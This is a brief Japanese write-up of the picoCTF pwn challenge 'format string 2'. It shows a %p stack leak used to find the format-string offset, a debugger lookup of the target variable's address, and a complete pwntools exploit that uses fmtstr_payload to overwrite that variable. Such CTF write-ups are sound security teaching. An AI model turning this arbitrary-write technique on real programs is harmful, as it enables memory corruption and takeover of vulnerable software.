---
title: "format string 2"
points: 200
tags: ["pwn"]
---

グローバル変数のsusが `0x67616c66 (flag)` になるのが勝利条件。

checksecによるとPIEは無効化されているので、`%p`をつかってoffsetを探る。

```
[~]$ ./vuln
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
Here's your input: 0x7fff0a9f1d20.(nil).(nil).0xb0.0x7f46b29adaa0.0x1.(nil).0x1.0x7f46b29d1160.0x7fff0a9f1f38.0x7fff0a9f1f40.
0x7f46b29d14e8.(nil).0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252
e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0
x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e7025
2e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x7f46b29d3800.0x7f46b29e9e30.0x7fff0a9f23b0.0x1.(nil).0x7fff
0a9f2448.0x403e18.0x7f46b29e544a.(nil).0x403e18.0x7fff0a9f2448.(nil).0x7f46b2a062d0.(nil).0x7f46b29d7b10.0x15ca0787ec34d600.0
x1.0x7f46b292993e.0x800000.0x2ffff00001f80.0x3b2a062d0.0x7f46b29e6970.0x2b22e387d6d67.0x7f46b29f05f1
sus = 0x21737573
You can do better!
```

同じく変数susのアドレスを調査。
```
gef➤  print &sus
$1 = (<data variable, no debug info> *) 0x404060 <sus>
```

FSBのAAW出来るようになったので、susを上書きして終わり。

```python
from pwn import *

context.arch='amd64'

p = process('./vuln')
# p = remote('rhea.picoctf.net', 60747)

payload = fmtstr_payload(14, {0x404060:p32(0x67616c66)}, numbwritten=0, write_size='byte')
print('[+] Payload: ', payload.decode('utf-8'))

p.sendlineafter(b"What do you have to say?", payload)

p.recvuntil(b'Here you go...')
print(p.recv().decode('utf-8'))
```